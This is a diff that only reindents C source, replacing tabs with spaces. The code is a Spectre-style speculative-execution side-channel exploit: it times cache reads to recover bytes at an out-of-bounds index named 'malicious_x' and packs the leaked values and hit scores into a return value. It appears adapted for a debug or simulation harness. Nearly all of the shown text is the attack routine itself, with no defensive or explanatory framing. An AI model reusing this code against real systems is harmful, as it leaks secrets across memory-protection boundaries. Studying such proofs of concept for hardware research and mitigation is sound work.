@@ -118,7 +118,7 @@ void readMemoryByte(uint32_t malicious_x, uint8_t value[2], int score[2])
 {
     int results[256];
     int tries, i, j, k, mix_i;
-	unsigned int junk = 0;
+    unsigned int junk = 0;
     uint64_t time1, time2;
     size_t training_x, x;
     volatile uint8_t* addr;
@@ -158,41 +158,41 @@ void readMemoryByte(uint32_t malicious_x, uint8_t value[2], int score[2])
             addr += mix_i * 512;
             time1 = debug_ts();
             debug_read(addr);
-			time2 = debug_ts() - time1;
-			if (time2 <= CACHE_HIT_THRESHOLD)
-				results[mix_i]++;
+            time2 = debug_ts() - time1;
+            if (time2 <= CACHE_HIT_THRESHOLD)
+                results[mix_i]++;
         }
 
-		j = k = -1;
-		for (i = 0; i < 256; i++)
-		{
-			if (j < 0 || results[i] >= results[j])
-			{
-				k = j;
-				j = i;
-			}
-			else if (k < 0 || results[i] >= results[k])
-			{
-				k = i;
-			}
-		}
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break;
-	}
+        j = k = -1;
+        for (i = 0; i < 256; i++)
+        {
+            if (j < 0 || results[i] >= results[j])
+            {
+                k = j;
+                j = i;
+            }
+            else if (k < 0 || results[i] >= results[k])
+            {
+                k = i;
+            }
+        }
+        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+            break;
+    }
 
-	value[0] = (uint8_t)j;
-	score[0] = results[j];
-	value[1] = (uint8_t)k;
-	score[1] = results[k];
+    value[0] = (uint8_t)j;
+    score[0] = results[j];
+    value[1] = (uint8_t)k;
+    score[1] = results[k];
 }
 
 int this_is_what_ive_got()
 {
-	uint32_t malicious_x = 0x100 + MALOFFSET; // use compiler argument to "step" this index
-	int score[2], len = 2;
-	uint8_t value[2];
-	readMemoryByte(malicious_x, value, score);
-	return (value[0] << 24) | (value[1] << 16) | ((score[0] & 0xff)<<8) | (score[1] & 0xff);
+    uint32_t malicious_x = 0x100 + MALOFFSET; // use compiler argument to "step" this index
+    int score[2], len = 2;
+    uint8_t value[2];
+    readMemoryByte(malicious_x, value, score);
+    return (value[0] << 24) | (value[1] << 16) | ((score[0] & 0xff)<<8) | (score[1] & 0xff);
 }
 
 int main() {}
